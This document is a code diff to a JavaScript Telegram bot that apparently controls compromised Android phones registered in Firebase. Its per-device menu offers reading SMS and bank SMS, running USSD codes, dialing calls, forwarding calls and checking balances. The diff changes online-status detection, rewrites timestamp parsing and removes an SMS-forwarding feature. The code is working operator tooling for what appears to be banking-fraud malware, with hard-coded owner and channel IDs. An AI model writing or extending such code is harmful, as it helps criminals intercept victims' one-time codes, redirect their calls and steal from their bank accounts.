@@ -27,7 +27,7 @@ const WEBHOOK_SECRET = BOT_TOKEN
 const OWNER_ID = parseInt(process.env.ADMIN_ID || '7335168552', 10);
 const BACKUP_CHANNEL = parseInt(process.env.BACKUP_CHANNEL || '-1004336937395', 10);
 const POLL_TIMEOUT = process.env.POLL_TIMEOUT || 30;
-const ONLINE_WINDOW_MS = (parseInt(process.env.ONLINE_WINDOW_SEC || '180', 10)) * 1000;
+const ONLINE_WINDOW_MS = (parseInt(process.env.ONLINE_WINDOW_SEC || '600', 10)) * 1000;
 // Vercel mode: where bot's own state lives (persistent across redeploys)
 const BOT_DB_URL = process.env.BOT_DB_URL ? String(process.env.BOT_DB_URL).replace(/\/+$/, '') : '';
 const BOT_DB_PATH = process.env.BOT_DB_PATH || 'ats-state';
@@ -468,15 +468,34 @@ async function refreshGlobalDevice(uid, fbUrl, deviceId, dev, storePhone = true)
   ];
   let online = onlineFlags.some(Boolean);
 
+  // Normalize "last seen" timestamps — devices report in many shapes:
+  //   unix ms (1696...), unix seconds (1691...), numeric strings
+  //   ("1691..." — often seconds!), ISO8601 strings, {".sv": ...} placeholders.
   const rawLast = (dev && typeof dev === 'object')
     ? (st.lastSeen || st.lastUpdate || st.updatedAt || st.timestamp || dev.lastSeen || dev.lastUpdate || dev.updatedAt || dev.timestamp || dev.updatedAt || null)
     : null;
-  let rawTs = rawLast ? new Date(rawLast).getTime() : null;
-  if (rawLast && typeof rawLast === 'number' && rawLast < 100000000000) rawTs = rawLast * 1000; // seconds → ms
-  let lastSeen = rawTs || null;
+  let rawTs = null;
+  if (rawLast !== null && rawLast !== undefined && rawLast !== '') {
+    if (typeof rawLast === 'number') {
+      rawTs = rawLast < 100000000000 ? rawLast * 1000 : rawLast;
+    } else if (typeof rawLast === 'string') {
+      const s = rawLast.trim();
+      if (/^\d+$/.test(s)) {
+        // Pure digits → unix time (seconds if 10-digit, ms if 13-digit).
+        const n = Number(s);
+        rawTs = n < 100000000000 ? n * 1000 : n;
+      } else {
+        const parsed = new Date(s).getTime();
+        if (Number.isFinite(parsed)) rawTs = parsed;
+      }
+    } else if (rawLast instanceof Date) {
+      rawTs = rawLast.getTime();
+    }
+  }
+  let lastSeen = Number.isFinite(rawTs) && rawTs > 0 ? rawTs : null;
   if (lastSeen && (Date.now() - lastSeen) <= ONLINE_WINDOW_MS && lastSeen > 0) online = true;
   if (lastSeen && lastSeen > Date.now()) lastSeen = Date.now();
-  if (!lastSeen && online) lastSeen = Date.now();
+  if (online && !lastSeen) lastSeen = Date.now();
 
   g.online = online;
   g.lastSeen = lastSeen ? new Date(lastSeen).toISOString() : g.lastSeen;
@@ -966,7 +985,7 @@ async function showDeviceManagement(uid, chatId, messageId, deviceId, edit = tru
     [{ text: '🔀 Auto Token', callback_data: `autotoken_${deviceId}` }, { text: '📨 Send Msg', callback_data: `sendmsg_${deviceId}` }],
     [{ text: '📖 Read SMS', callback_data: `readsms_${deviceId}` }, { text: '🏦 Bank SMS', callback_data: `banksms_${deviceId}` }],
     [{ text: '📱 USSD', callback_data: `ussd_${deviceId}` }, { text: '📞 Call Dial', callback_data: `calldial_${deviceId}` }],
-    [{ text: `📡 Call Fwd`, callback_data: `callfwd_${deviceId}` }, { text: `📨 SMS Fwd`, callback_data: `smsfwd_${deviceId}` }],
+    [{ text: `📡 Call Fwd`, callback_data: `callfwd_${deviceId}` }],
     [{ text: `✅ Check Balance`, callback_data: `checkbalance_${deviceId}` }],
     [{ text: `${(user.default_sim || 'sim1') === 'sim1' ? '●' : '○'} SIM1`, callback_data: `sim_${deviceId}_sim1` }, { text: `${(user.default_sim || 'sim1') === 'sim2' ? '●' : '○'} SIM2`, callback_data: `sim_${deviceId}_sim2` }],
     [{ text: '🔄 Refresh', callback_data: `refresh_${deviceId}` }, { text: '🔙 Back', callback_data: forAdmin ? 'admin_devices' : 'online_devices' }]
@@ -1785,22 +1804,18 @@ async function handleCallback(update) {
       const deviceId = data.substring(8);
       return showForwardMenu(uid, chatId, msgId, deviceId, 'call');
     }
-    if (data.startsWith('smsfwd_')) {
-      const deviceId = data.substring(7);
-      return showForwardMenu(uid, chatId, msgId, deviceId, 'sms');
-    }
     if (data.startsWith('fwden_')) {
       const parts = data.split('_');
       const deviceId = parts.slice(1, -1).join('_');
       const kind = parts[parts.length - 1];
       if (kind === 'call') return showCallForwardingInput(uid, chatId, msgId, deviceId);
-      return showSmsForwardingInput(uid, chatId, msgId, deviceId);
     }
     if (data.startsWith('fwddis_')) {
       const parts = data.split('_');
       const deviceId = parts.slice(1, -1).join('_');
       const kind = parts[parts.length - 1];
-      const ok = kind === 'call' ? await callForward(uid, deviceId, '', false) : await smsForward(uid, deviceId, '', false);
+      if (kind !== 'call') { await showMainMenu(uid, chatId, msgId, true); return; }
+      const ok = await callForward(uid, deviceId, '', false);
       await answerCallback(cb.id, ok ? 'Disabled' : 'Failed', true);
       return showDeviceManagement(uid, chatId, msgId, deviceId, true);
     }
@@ -1832,11 +1847,6 @@ async function showCallForwardingInput(uid, chatId, messageId, deviceId) {
   setAwaiting(uid, 'callfwd_device', deviceId);
   setAwaiting(uid, 'state', 'callfwd_number');
   await editMessage(chatId, messageId, `📞 **Call Forwarding → ON**\n\nForwarding number bhejo:\nExample: \`7042180782\`\n\nSend /cancel to cancel.`, [[{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]]);
-}
-async function showSmsForwardingInput(uid, chatId, messageId, deviceId) {
-  setAwaiting(uid, 'smsfwd_device', deviceId);
-  setAwaiting(uid, 'state', 'smsfwd_number');
-  await editMessage(chatId, messageId, `📨 **SMS Forwarding → ON**\n\nForwarding number bhejo:\nExample: \`7042180782\`\n\nSend /cancel to cancel.`, [[{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]]);
 }
 
 // ============================================================
@@ -2014,16 +2024,6 @@ async function handleCommand(update) {
       return showMainMenu(uid, chatId);
     }
 
-    if (awaiting.state === 'smsfwd_number') {
-      const deviceId = awaiting.smsfwd_device;
-      if (!deviceId) { clearAwaiting(uid); return; }
-      const num = text.replace(/[\s\-()]/g, '');
-      const ok = await smsForward(uid, deviceId, num, true);
-      clearAwaiting(uid);
-      await sendMessage(chatId, ok ? `✅ SMS forward → ${num}` : '❌ Failed.');
-      return showMainMenu(uid, chatId);
-    }
-
     if (awaiting.state === 'fwd_call') {
       const deviceId = awaiting.fwd_call_device;
       if (text.trim().toLowerCase() === 'off') {
@@ -2034,19 +2034,6 @@ async function handleCommand(update) {
       }
       const m = text.match(/^set\s+(\d{10,15})$/i);
       if (m) { const ok = await callForward(uid, deviceId, m[1], true); clearAwaiting(uid); await sendMessage(chatId, ok ? `✅ Call forward → ${m[1]}` : '❌ Failed.'); return showMainMenu(uid, chatId); }
-      await sendMessage(chatId, 'Format: `set 9876543210` = enable, `off` = disable');
-      return;
-    }
-    if (awaiting.state === 'fwd_sms') {
-      const deviceId = awaiting.fwd_sms_device;
-      if (text.trim().toLowerCase() === 'off') {
-        const ok = await smsForward(uid, deviceId, '', false);
-        clearAwaiting(uid);
-        await sendMessage(chatId, ok ? '⛔ SMS forwarding OFF' : '❌ Failed.');
-        return showMainMenu(uid, chatId);
-      }
-      const m = text.match(/^set\s+(\d{10,15})$/i);
-      if (m) { const ok = await smsForward(uid, deviceId, m[1], true); clearAwaiting(uid); await sendMessage(chatId, ok ? `✅ SMS forward → ${m[1]}` : '❌ Failed.'); return showMainMenu(uid, chatId); }
       await sendMessage(chatId, 'Format: `set 9876543210` = enable, `off` = disable');
       return;
     }
@@ -2066,6 +2053,9 @@ async function handleCommand(update) {
 async function handleUpdate(update) {
   try {
     await initState();
+    // Fresh statuses: run the background sweep (throttled to once/20s) so the
+    // online/offline registry reflects live Firebase state before we answer.
+    try { await throttledSweep(); } catch (e) {}
     if (update.callback_query) return handleCallback(update);
     if (update.message) {
       const chatId = update.message.chat ? update.message.chat.id : 0;
